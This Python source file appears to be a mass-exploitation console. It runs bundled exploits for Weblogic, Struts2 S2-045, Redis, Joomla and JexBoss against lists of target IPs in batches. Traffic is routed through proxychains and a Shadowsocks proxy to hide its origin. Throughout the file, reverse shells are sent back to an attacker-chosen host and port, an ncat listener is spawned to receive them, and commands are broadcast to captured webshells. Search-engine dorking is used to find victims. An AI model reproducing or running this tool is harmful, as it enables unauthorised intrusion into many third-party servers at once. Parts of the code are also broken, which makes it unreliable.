#!/usr/bin/python3

import sys
import os
import time
import subprocess
import signal
import traceback
import util.console as console
import util.colors as colors
import util.webshell as ws
import util.baidu as baidu

# mark home for our way back
init_dir = os.getcwd()
proxy_conf = str(init_dir) + '/data/proxy.conf'
proxy = True

# default target list
ip_list = 'data/ip_list.txt'


def debug_except():
    if input(colors.CYAN + '[?] Display traceback? [y/n] ').strip() == 'y':
        tb = traceback.format_exc()
        console.print_error(str(tb))


# kill process by name
def check_kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


def list_exp():
    def is_executable(path):
        return os.path.isfile(path) and os.access(path, os.X_OK)

    for root, dirs, files in os.walk('exploits'):
        paths = []
        for f in files:
            path = './' + root + '/' + f
            paths.append(path)
        for p in paths:
            poc = '/'.join(p.split('/')[2:])
            if len(p.split('/')) > 4:
                continue
            if is_executable(p):
                print(colors.BLUE + poc + colors.END)


def jexboss(cmd, exploit_path):
    global proxy_conf
    try:
        cmd = cmd.split()
        try:
            args = cmd[1:]
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, exploit_path] + args)
        except BaseException:
            subprocess.call(['python', exploit_path, '-h'])
    except Exception as e:
        console.print_error(
            "[-] Error starting {}: ".format(exploit_path) + str(e))
        debug_except()


def execute(cmd):
    global proxy_conf
    global ip_list
    global init_dir
    cmd = str(cmd).lower().strip()
    if cmd == '':
        pass
    elif cmd == 'info':
        print(
            colors.CYAN +
            '[*] Init directory: {}\n[*] Target: {}\n[*] Proxy config: {}'.format(
                init_dir,
                ip_list,
                proxy_conf))
    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])
        print(colors.BLUE + '[i] Target changed to {}'.format(target))
        ip_list = 'data/' + target
    elif cmd == 'init' or cmd == 'i':
        print(colors.CYAN + '[*] Going back to init_dir...' + colors.END)
        os.chdir(init_dir)
    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir('output')
            print(colors.PURPLE + '[*] Searching on Baidu...' + colors.END)
            baidu.spider(dork, count)
        except Exception as e:
            console.print_error('[-] Error with baidu: ' + str(e))
            debug_except()
    elif cmd == 'proxy':
        if not os.path.exists('data/ss.json'):
            console.print_error('[-] Please make sure \"data/ss.json\" exists')
        try:
            subprocess.Popen(['./tools/ss-proxy', '-c', './data/ss.json'],
                             stderr=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             shell=False)
        except Exception as e:
            console.print_error(
                '[-] Error starting Shadowsocks proxy: ' + str(e))
            debug_except()
    elif cmd.startswith('webshell'):
        try:
            command = cmd.split()
            if command[1] == '-b':
                try:
                    ws.loadShells('webshell.list')
                    cmd = input(colors.CYAN + 'CMD >> ' + colors.END)
                    ws.broadcast(cmd)
                except Exception as e:
                    console.print_error(
                        '[-] Error with webshell broadcasting: ' + str(e))
                    debug_except()
            else:
                pass
        except BaseException:
            if cmd == 'webshell':
                try:
                    ws.loadShells('webshell.list')
                    shell = input('[*] Select a shell: ').strip()
                    ws.ctrl(shell)
                except Exception as e:
                    console.print_error('[-] Error with webshell: ' + str(e))
                    debug_except()
    elif cmd == 'redis':
        answ = input(
            '[*] Executing redis mass exploit against `targets`, proceed? [y/n] ')
        os.chdir('./exploits/redis/')
        if answ.lower() == 'y':
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, 'python', 'massAttack.py'])
        else:
            pass
    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
            pass
        except Exception as e:
            console.print_error(e)
            debug_except()
    elif cmd.startswith('jexboss'):
        jexboss(cmd, './exploits/jexboss/jexboss.py')
    elif cmd == 'q' or cmd == 'quit':
        check_kill_process('ss-proxy')
        print("[+] Exiting...")
        sys.exit(0)
    elif cmd == 'h' or cmd == 'help' or cmd == '?':
        print(console.help)
    elif cmd == 'exploits':
        print(colors.CYAN + '[+] Available exploits: ' + colors.END)
        #os.system('tree -f ./exploits')
        list_exp()
    elif cmd == 'z' or cmd == "zoomeye":
        try:
            os.chdir('./zoomeye')
            subprocess.call(['python', 'zoomeye.py'])
        except Exception as e:
            console.print_error('[-] Cannot start zoomeye.py:\n' + str(e))
            debug_except()
    elif cmd == 'x' or cmd == 'clear':
        subprocess.call("clear")
    elif cmd == 'c' or cmd == 'reset':
        subprocess.call("reset")
    elif cmd == "attack" or cmd == "e":
        attack()
    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END +
                colors.GREEN +
                cmd +
                colors.END +
                '\n')
            os.system(cmd)
        except Exception as e:
            console.print_error(
                "[-] Error executing shell command `{}`: ".format(cmd) + str(e))
            debug_except()


# gonna use this in our exploiter
scanner_args = []


def weblogic():
    print(colors.BLUE + '\n[*] Welcome to Weblogic exploit' + colors.END)
    server_port = input(
        colors.BLUE +
        '[?] What\'s the port of Weblogic server? ' +
        colors.END)
    os_type = str(
        input(
            colors.BLUE +
            '[?] Windows or Linux? [w/l] ' +
            colors.END))
    if str(
        input(
            colors.BLUE +
            '[?] Do you need a reverse shell? [y/n] ' +
            colors.END)).strip().lower() == 'y':
        shellServer = input(
            colors.BLUE +
            '[?] What\'s the IP of shell receiver? ' +
            colors.END)
        port = input(
            colors.BLUE +
            '[?] What\'s the port of shell receiver? ' +
            colors.END)
        if os_type.lower() == 'w':
            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
                shellServer, port, server_port).split()
        elif os_type.lower() == 'l':
            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
                shellServer, port, server_port).split()
        else:
            console.print_error('[-] Invalid input')
            return
    else:
        cmd = str(
            input(colors.BLUE +
                  '[?] What command do you want to execute on the target? ' +
                  colors.END)).strip(
        )
        if os_type.lower() == 'w':
            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
                server_port, cmd)
        elif os_type.lower() == 'l':
            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
                server_port, cmd)
        else:
            return

    # start scanner
    exploit = 'weblogic.py'
    work_path = '/weblogic/'
    exec_path = exploit
    jobs = 100
    # waitTime = 25  # actually it's deprecated
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
    scanner(scanner_args)


# currently not available
def redis():
    print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
    answ = input(
        '[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ')
    os.chdir('./exploits/redis/')
    if answ.lower() == 'y':
        subprocess.call(['proxychains4', '-q', '-f',
                         proxy_conf, 'python', 'massAttack.py'])
    else:
        pass


def s2_045():
    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
    port = str(input('[?] What\'s the port of your target server? ').strip())

    # args list
    exploit = 's2_045_cmd.py'
    work_path = '/structs2/'
    exec_path = exploit
    custom_args = str('-p ' + port).split()
    jobs = 100

    print(
        colors.BLUE +
        '[*] Your exploit will be executed like\n' +
        colors.END,
        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
        ' '.join(custom_args))
    # start scanner
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
    scanner(scanner_args)


def witbe():
    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)

    # shell server config
    rhost = str(input('[?] IP of your shell server: ')).strip()
    rport = str(input('[?] and Port? ')).strip()

    # exploit config
    exploit = 'witbe.py'
    work_path = '/witbe/'
    exec_path = exploit
    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
    jobs = 50


def attack():
    global proxy_conf
    global proxy
    global scanner_args
    if str(
        input(
            colors.CYAN +
            '[?] Do you wish to use proxychains? [y/n] ' +
            colors.END)).strip().lower() == 'y':
        proxy = True
    else:
        proxy = False
    answ = str(
        input(
            colors.DARKCYAN +
            colors.BOLD +
            '\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ' +
            colors.END)).strip()
    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.built_in)
        answ = int(
            input(
                colors.CYAN +
                colors.BOLD +
                '[=] Your choice: ' +
                colors.END))
        if answ == 2:
            redis()
        elif answ == 1:
            console.print_error('\n[-] Under development')
        elif answ == 0:
            weblogic()
        elif answ == 3:
            s2_045()
        else:
            console.print_error('\n[-] Invalid input!')
    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, in here you can choose your own exploit\n" +
            colors.END)
        print(colors.CYAN + '[*] Here are available exploits:\n' + colors.END)
        list_exp()
        exploit = input(
            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
        jobs = int(input("[?] How many processes each time? "))
        custom_args = []
        answ = input("[?] Do you need a reverse shell [y/n]? ").strip()
        if answ == 'y':
            lhost = input(
                "[*] Where do you want me to send shells? ").strip()
            lport = input(
                "[*] and at what port? (make sure you have access to that port) ").strip()
            custom_args = ['-l', lhost, '-p', lport]
            answ = input('[*] Do you need me to start a listener? [y/n] ')
            if answ == 'y':
                print("\n[*] Spawning ncat listener in new window...\n")
                try:
                    listener = subprocess.Popen(
                        args=[
                            "gnome-terminal",
                            "--command=ncat -nklvp " +
                            lport +
                            " -m 1000"],
                        shell=False,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
                except BaseException:
                    print(
                        colors.YELLOW +
                        "[-] Could not launch our listener, do you have GNOME-Terminal installed?" +
                        colors.END +
                        '\n')
            else:
                print(
                    "[*] Okay, just make sure you receive the reverse shells\n")
        else:
            pass
        custom_args += input(
            "[*] args for this exploit (target IP is handled already) ").strip().split()
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        d = '/'
        exec_path = d.join(exec_path)
        work_path = d.join(work_path)
        d = ' '
        print(
            colors.BLUE +
            '[*] Your exploit will be executed like\n' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            d.join(custom_args))
        scanner_args = (
            exploit,
            work_path,
            exec_path,
            custom_args,
            jobs)
        scanner(scanner_args)
    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    global ip_list
    global proxy
    exploit, work_path, exec_path, custom_args, jobs = scanner_args[
        0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
    if proxy:
        e_args = [
            'proxychains4',
            '-q',
            '-f',
            proxy_conf,
            './' + exec_path]
    else:
        e_args = ['./' + exec_path]
    e_args += custom_args
    e_args += ['-t']
    f = open(init_dir + '/' + ip_list)
    os.chdir('./exploits/' + work_path)
    console.print_warning('\n[!] DEBUG: ' + e_args)
    console.print_warning('\n[!] It might be messy, get ready!' + '\n')
    time.sleep(3)
    count = 0
    tested = count
    rnd = 1
    for line in f:
        ip = line.strip()
        progress = colors.BLUE + colors.BOLD + 'ROUND.' + \
            str(rnd) + colors.END + '  ' + colors.CYAN + colors.BOLD + \
            str(tested + 1) + colors.END + ' targets found\n'
        try:
            sys.stdout.write('\r' + progress)
            sys.stdout.flush()
        except KeyboardInterrupt:
            exit()
        count += 1
        tested += 1
        try:
            e_args += [ip]
            print(e_args)
            proc = subprocess.Popen(e_args)

            # continue to next target
            e_args.remove(ip)
            time.sleep(.1)

            if count == jobs or count == 0:
                count = 0
                rnd += 1
                out, err = proc.communicate()
                if proc.returncode is not None:
                    proc.kill()
                continue
            sys.stdout.flush()
            os.system('clear')
        except BaseException:
            pass
    os.system('clear')
    os.chdir(init_dir)
    console.print_success('\n[+] All done!\n')
    print(console.intro)


def main():
    global ip_list
    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()
    if answ.lower() == 'n':
        os.system("ls data")
        ip_list = 'data/' + str(
            input(
                colors.CYAN +
                '[=] Choose your target IP list (must be in ./data) ')).strip()
        if ip_list == 'data/':
            ip_list = 'data/ip_list.txt'
    else:
        pass
    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                colors.UNDERLINE +
                "\nmec" +
                colors.END +
                colors.CYAN +
                colors.BOLD +
                " > " +
                colors.END)
            try:
                execute(cmd)
            except Exception as e:
                print(colors.RED + "[-] Error with command: ", e, colors.END)
                debug_except()
        except KeyboardInterrupt:
            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            if answ.lower() == 'y':
                print("\n[+] Exiting...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue


if __name__ == "__main__":
    try:
        print(console.intro)
        # console.ConsoleShell().cmdloop()
        main()
    except Exception as e:
        console.print_error('[-] Error at main: ' + str(e))
        debug_except()
    except KeyboardInterrupt:
        console.print_error('[-] Exiting...')
